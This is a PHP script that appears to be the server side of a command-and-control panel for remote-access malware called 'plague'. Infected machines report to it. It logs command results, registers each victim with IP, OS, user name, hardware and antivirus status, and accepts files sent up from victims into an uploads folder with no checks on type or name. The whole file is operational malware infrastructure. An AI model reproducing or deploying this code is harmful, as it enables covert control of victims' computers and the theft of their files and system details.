<?php
include('data.php');
define("RT_STRING", 1);
define("RT_FILE", 2);
define("RT_REGISTER", 3);

if(!isset($_POST['GUID'])){
	http_response_code(400);
	die('GUID not set.');
} else $GUID = $_POST['GUID'];

if(!isset($_POST['RT'])){
	http_response_code(400);
	die('Response type not set.');
} else $RT = $_POST['RT'];

if(!isset($_POST['ID'])){
	http_response_code(400);
	die('Command identifier not set.');
} else $ID = $_POST['ID'];

if(!ConnectDB('plague')){
	http_response_code(500);
	die('Failed to connect to the database.');
}

$CanRemove = !isset($_POST['Continue']);

switch($RT){
	case RT_STRING:{
		if(!isset($_POST['Result'])){
			http_response_code(400);
			die('Result not set.');
	    } else $R = $_POST['Result'];
		SetResult($GUID, $R);
		if($R=='Uninstalling...'){
			$CanRemove = false;
			RemoveClient($GUID);
		}
	} break;
	case RT_FILE:{
		if(!isset($_FILES['File'])){
			http_response_code(400);
			die('File not found.');
	    }
		$Target = 'uploads/' . round((microtime(true) * 1000)+rand(1, 100000)) . '_' . basename($_FILES['File']['name']);
		move_uploaded_file($_FILES['File']['tmp_name'], $Target);
		SetResult($GUID, 'File upload complete.');
	} break;
	case RT_REGISTER:{
		$V = array($_POST['Nick'], $_SERVER['REMOTE_ADDR'], $_POST['OS'], $_POST['Comp'], $_POST['User'], $_POST['CPU'], $_POST['GPU'], $_POST['Anti'], $_POST['Def'], $_POST['Inf']);
		CompleteRegister($GUID, $V);
		SetResult($GUID, 'New client connected.');
	} break;
}

if($CanRemove) RemoveCommand($GUID, $ID);

echo("Result accepted. ^_^");

?>